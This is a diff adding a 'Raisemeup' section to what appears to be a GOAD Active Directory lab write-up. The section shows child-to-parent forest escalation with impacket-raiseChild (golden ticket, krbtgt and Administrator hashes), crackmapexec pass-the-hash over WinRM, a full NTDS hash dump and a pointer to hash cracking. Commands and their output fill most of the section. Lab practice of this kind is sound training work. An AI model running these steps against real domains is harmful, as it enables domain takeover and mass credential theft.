@@ -299,6 +299,7 @@
         <li><a href="#mssql">MSSQL</a></li>
         <li><a href="#bloodhound">Bloodhound</a></li>
         <li><a href="#privilege-escalation">Privilege escalation</a></li>
+        <li><a href="#raisemeup">Raisemeup</a></li>
       </ol>
     </li>
   </ol>
@@ -365,7 +366,7 @@
 
 
                 <time class="article-time--reading">
-                    11 minute read
+                    13 minute read
                 </time>
             </div>
         
@@ -1373,6 +1374,150 @@
 <p>NTLM hashes are just md5 hashes with the fancy name:).</p>
 <p>And we pwn the NORTH :)</p>
 <hr>
+<h3 id="raisemeup">Raisemeup
+</h3><p>We now need to escalate from child domain to parent domain. In this case north.sevenkingdoms.local to sevenkingdoms.local</p>
+<p>We can use impacket-raisechild</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">impacket-raiseChild north.sevenkingdoms.local/john:&#39;H4x00r123..&#39; 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[*] Raising child domain north.sevenkingdoms.local
+</span></span><span class="line"><span class="cl">[*] Forest FQDN is: sevenkingdoms.local
+</span></span><span class="line"><span class="cl">[*] Raising north.sevenkingdoms.local to sevenkingdoms.local
+</span></span><span class="line"><span class="cl">[*] sevenkingdoms.local Enterprise Admin SID is: S-1-5-21-2593120635-1589445922-2702696661-519
+</span></span><span class="line"><span class="cl">[*] Getting credentials for north.sevenkingdoms.local
+</span></span><span class="line"><span class="cl">north.sevenkingdoms.local/krbtgt:502:aad3b435b51404eeaad3b435b51404ee:3e1aa23cbaaed62c05427ff7148c04d8:::
+</span></span><span class="line"><span class="cl">north.sevenkingdoms.local/krbtgt:aes256-cts-hmac-sha1-96s:3955f047341f1c503f0e4c0319e022508c1493da98e7a8bbb052a74f8fd21872
+</span></span><span class="line"><span class="cl">[*] Getting credentials for sevenkingdoms.local
+</span></span><span class="line"><span class="cl">sevenkingdoms.local/krbtgt:502:aad3b435b51404eeaad3b435b51404ee:961dd9c581fb10b66d4d141ca6a6efbc:::
+</span></span><span class="line"><span class="cl">sevenkingdoms.local/krbtgt:aes256-cts-hmac-sha1-96s:50e85a7b53c4b652b469104f764577cb31448ebba755df993fd6424262083a0e
+</span></span><span class="line"><span class="cl">[*] Target User account name is Administrator
+</span></span><span class="line"><span class="cl">sevenkingdoms.local/Administrator:500:aad3b435b51404eeaad3b435b51404ee:c66d72021a2d4744409969a581a1705e:::
+</span></span><span class="line"><span class="cl">sevenkingdoms.local/Administrator:aes256-cts-hmac-sha1-96s:bdb1a615bc9d82d2ab21f09f11baaef4bc66c48efdd56424e1206e581e4dd827
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>This will create  a golden ticket for Administrator on the main domain. Then use it to dump secret. So we get the Administrator NTLM hash.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">crackmapexec winrm sevenkingdoms.local -u Administrator -H c66d72021a2d4744409969a581a1705e -d sevenkingdoms.local 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">HTTP        kingslanding    5986   sevenkingdoms.local [*] https://kingslanding:5986/wsman
+</span></span><span class="line"><span class="cl">WINRM       kingslanding    5986   sevenkingdoms.local [+] sevenkingdoms.local\Administrator:c66d72021a2d4744409969a581a1705e (Pwn3d!)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>With this we can dump all secrets, ill use crackmapexec smb.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">crackmapexec</span> <span class="n">smb</span> <span class="n">sevenkingdoms</span><span class="o">.</span><span class="n">local</span> <span class="o">-</span><span class="n">u</span> <span class="n">Administrator</span> <span class="o">-</span><span class="n">H</span> <span class="n">c66d72021a2d4744409969a581a1705e</span> <span class="o">-</span><span class="n">d</span> <span class="n">sevenkingdoms</span><span class="o">.</span><span class="n">local</span> <span class="o">--</span><span class="n">ntds</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">SMB</span>         <span class="n">kingslanding</span>    <span class="mi">445</span>    <span class="n">KINGSLANDING</span>     <span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Dumping</span> <span class="n">the</span> <span class="n">NTDS</span><span class="p">,</span> <span class="n">this</span> <span class="n">could</span> <span class="n">take</span> <span class="n">a</span> <span class="k">while</span> <span class="n">so</span> <span class="n">go</span> <span class="n">grab</span> <span class="n">a</span> <span class="n">redbull</span><span class="o">...</span>
+</span></span><span class="line"><span class="cl"><span class="n">SMB</span>         <span class="n">kingslanding</span>    <span class="mi">445</span>    <span class="n">KINGSLANDING</span>     <span class="n">Administrator</span><span class="p">:</span><span class="mi">500</span><span class="p">:</span><span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="n">c66d72021a2d4744409969a581a1705e</span><span class="p">:::</span>
+</span></span><span class="line"><span class="cl"><span class="n">SMB</span>         <span class="n">kingslanding</span>    <span class="mi">445</span>    <span class="n">KINGSLANDING</span>     <span class="n">Guest</span><span class="p">:</span><span class="mi">501</span><span class="p">:</span><span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="mi">31</span><span class="n">d6cfe0d16ae931b73c59d7e0c089c0</span><span class="p">:::</span>
+</span></span><span class="line"><span class="cl"><span class="n">SMB</span>         <span class="n">kingslanding</span>    <span class="mi">445</span>    <span class="n">KINGSLANDING</span>     <span class="n">krbtgt</span><span class="p">:</span><span class="mi">502</span><span class="p">:</span><span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="mi">961</span><span class="n">dd9c581fb10b66d4d141ca6a6efbc</span><span class="p">:::</span>
+</span></span><span class="line"><span class="cl"><span class="n">SMB</span>         <span class="n">kingslanding</span>    <span class="mi">445</span>    <span class="n">KINGSLANDING</span>     <span class="n">vagrant</span><span class="p">:</span><span class="mi">1000</span><span class="p">:</span><span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="n">e02bc503339d51f71d913c245d35b50b</span><span class="p">:::</span>
+</span></span><span class="line"><span class="cl"><span class="n">SMB</span>         <span class="n">kingslanding</span>    <span class="mi">445</span>    <span class="n">KINGSLANDING</span>     <span class="n">tywin</span><span class="o">.</span><span class="n">lannister</span><span class="p">:</span><span class="mi">1112</span><span class="p">:</span><span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="n">af52e9ec3471788111a6308abff2e9b7</span><span class="p">:::</span>
+</span></span><span class="line"><span class="cl"><span class="n">SMB</span>         <span class="n">kingslanding</span>    <span class="mi">445</span>    <span class="n">KINGSLANDING</span>     <span class="n">jaime</span><span class="o">.</span><span class="n">lannister</span><span class="p">:</span><span class="mi">1113</span><span class="p">:</span><span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="mf">12e3795</span><span class="n">b7dedb3bb741f2e2869616080</span><span class="p">:::</span>
+</span></span><span class="line"><span class="cl"><span class="n">SMB</span>         <span class="n">kingslanding</span>    <span class="mi">445</span>    <span class="n">KINGSLANDING</span>     <span class="n">cersei</span><span class="o">.</span><span class="n">lannister</span><span class="p">:</span><span class="mi">1114</span><span class="p">:</span><span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="n">c247f62516b53893c7addcf8c349954b</span><span class="p">:::</span>
+</span></span><span class="line"><span class="cl"><span class="n">SMB</span>         <span class="n">kingslanding</span>    <span class="mi">445</span>    <span class="n">KINGSLANDING</span>     <span class="n">tyron</span><span class="o">.</span><span class="n">lannister</span><span class="p">:</span><span class="mi">1115</span><span class="p">:</span><span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="n">b3b3717f7d51b37fb325f7e7d048e998</span><span class="p">:::</span>
+</span></span><span class="line"><span class="cl"><span class="n">SMB</span>         <span class="n">kingslanding</span>    <span class="mi">445</span>    <span class="n">KINGSLANDING</span>     <span class="n">robert</span><span class="o">.</span><span class="n">baratheon</span><span class="p">:</span><span class="mi">1116</span><span class="p">:</span><span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="mi">9029</span><span class="n">cf007326107eb1c519c84ea60dbe</span><span class="p">:::</span>
+</span></span><span class="line"><span class="cl"><span class="n">SMB</span>         <span class="n">kingslanding</span>    <span class="mi">445</span>    <span class="n">KINGSLANDING</span>     <span class="n">joffrey</span><span class="o">.</span><span class="n">baratheon</span><span class="p">:</span><span class="mi">1117</span><span class="p">:</span><span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="mi">3</span><span class="n">b60abbc25770511334b3829866b08f1</span><span class="p">:::</span>
+</span></span><span class="line"><span class="cl"><span class="n">SMB</span>         <span class="n">kingslanding</span>    <span class="mi">445</span>    <span class="n">KINGSLANDING</span>     <span class="n">renly</span><span class="o">.</span><span class="n">baratheon</span><span class="p">:</span><span class="mi">1118</span><span class="p">:</span><span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="mf">1e9</span><span class="n">ed4fc99088768eed631acfcd49bce</span><span class="p">:::</span>
+</span></span><span class="line"><span class="cl"><span class="n">SMB</span>         <span class="n">kingslanding</span>    <span class="mi">445</span>    <span class="n">KINGSLANDING</span>     <span class="n">stannis</span><span class="o">.</span><span class="n">baratheon</span><span class="p">:</span><span class="mi">1119</span><span class="p">:</span><span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="n">d75b9fdf23c0d9a6549cff9ed6e489cd</span><span class="p">:::</span>
+</span></span><span class="line"><span class="cl"><span class="n">SMB</span>         <span class="n">kingslanding</span>    <span class="mi">445</span>    <span class="n">KINGSLANDING</span>     <span class="n">petyer</span><span class="o">.</span><span class="n">baelish</span><span class="p">:</span><span class="mi">1120</span><span class="p">:</span><span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="mi">6</span><span class="n">c439acfa121a821552568b086c8d210</span><span class="p">:::</span>
+</span></span><span class="line"><span class="cl"><span class="n">SMB</span>         <span class="n">kingslanding</span>    <span class="mi">445</span>    <span class="n">KINGSLANDING</span>     <span class="n">lord</span><span class="o">.</span><span class="n">varys</span><span class="p">:</span><span class="mi">1121</span><span class="p">:</span><span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="mi">52</span><span class="n">ff2a79823d81d6a3f4f8261d7acc59</span><span class="p">:::</span>
+</span></span><span class="line"><span class="cl"><span class="n">SMB</span>         <span class="n">kingslanding</span>    <span class="mi">445</span>    <span class="n">KINGSLANDING</span>     <span class="n">maester</span><span class="o">.</span><span class="n">pycelle</span><span class="p">:</span><span class="mi">1122</span><span class="p">:</span><span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="mi">9</span><span class="n">a2a96fa3ba6564e755e8d455c007952</span><span class="p">:::</span>
+</span></span><span class="line"><span class="cl"><span class="n">SMB</span>         <span class="n">kingslanding</span>    <span class="mi">445</span>    <span class="n">KINGSLANDING</span>     <span class="n">KINGSLANDING</span><span class="o">$</span><span class="p">:</span><span class="mi">1001</span><span class="p">:</span><span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="mi">5957852</span><span class="n">cf538c6fd889c94f3bb2473d8</span><span class="p">:::</span>
+</span></span><span class="line"><span class="cl"><span class="n">SMB</span>         <span class="n">kingslanding</span>    <span class="mi">445</span>    <span class="n">KINGSLANDING</span>     <span class="n">NORTH</span><span class="o">$</span><span class="p">:</span><span class="mi">1104</span><span class="p">:</span><span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="mi">02</span><span class="n">f4f0cba0ec04eae62a64df80330594</span><span class="p">:::</span>
+</span></span><span class="line"><span class="cl"><span class="n">SMB</span>         <span class="n">kingslanding</span>    <span class="mi">445</span>    <span class="n">KINGSLANDING</span>     <span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Dumped</span> <span class="mi">17</span> <span class="n">NTDS</span> <span class="n">hashes</span> <span class="n">to</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">kali</span><span class="o">/.</span><span class="n">cme</span><span class="o">/</span><span class="n">logs</span><span class="o">/</span><span class="n">KINGSLANDING_kingslanding_2024</span><span class="o">-</span><span class="mi">11</span><span class="o">-</span><span class="mi">10</span><span class="n">_135107</span><span class="o">.</span><span class="n">ntds</span> <span class="n">of</span> <span class="n">which</span> <span class="mi">15</span> <span class="n">were</span> <span class="n">added</span> <span class="n">to</span> <span class="n">the</span> <span class="n">database</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We can try and crack some of the hashes using <a class="link" href="https://crackstation.net"  target="_blank" rel="noopener"
+    >crackstation</a></p>
+<p><img src="/images/goad_light/crack.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="crackstation"
+	
+	
+></p>
+<hr>
+<p>Delegations</p>
+<p>First we need to find the delegations in the domain.</p>
+<p>There are 2 types of delegations:</p>
+<ul>
+<li>Constrained</li>
+<li>Unconstrained</li>
+</ul>
+<p>By default child domain have Unconstrained delegation in the Parent domain</p>
+<p>Read about them <a class="link" href="https://en.hackndo.com/constrained-unconstrained-delegation/"  target="_blank" rel="noopener"
+    >here</a></p>
+<p>We can exploit this to achieve the same result. This is the manual way to get what imapacket-raiseChild did.</p>
+<p>Ill addd this section later :).</p>
+<p>We have pwned KINGSLANDING.</p>
+<hr>
+<p><img src="https://raw.githubusercontent.com/f0rk3b0mb/BIC_defcon31_TTchat/main/images/download.jpeg"
+	
+	
+	
+	loading="lazy"
+	
+		alt="gif"
+	
+	
+></p>
 
 </section>
 
